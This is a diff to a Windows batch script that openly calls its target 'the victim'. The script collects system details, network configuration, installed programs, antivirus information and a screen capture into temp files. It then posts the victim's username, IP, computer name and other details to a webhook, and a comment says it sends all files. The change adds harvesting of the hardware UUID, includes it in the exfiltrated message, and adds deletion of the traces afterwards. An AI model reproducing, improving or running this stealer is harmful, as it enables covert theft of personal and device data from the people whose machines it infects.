@@ -24,6 +24,9 @@ wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NU
 echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
 wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
 systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt >NUL
+wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
+set /p hwid=<%userprofile%\AppData\Local\Temp\uuid.txt
+
 
 ::gets the ipconfig (also local ip)
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt >NUL
@@ -64,7 +67,7 @@ timeout 1 >NUL
 Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 >NUL
 
 ::sends the username, ip, current time, and date of the victim
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername%\"}" %webhook%  >NUL
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% HWID = %hwid%\"}" %webhook%  >NUL
 
 
 ::sends all files
@@ -113,3 +116,4 @@ del %userprofile%\AppData\Local\Temp\antivirus.txt >NUL
 del %userprofile%\AppData\Local\Temp\test.ps1 >NUL
 del %userprofile%\AppData\Local\Temp\programms.txt >NUL
 del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg >NUL
+del %userprofile%\AppData\Local\Temp\uuid.txt >NUL
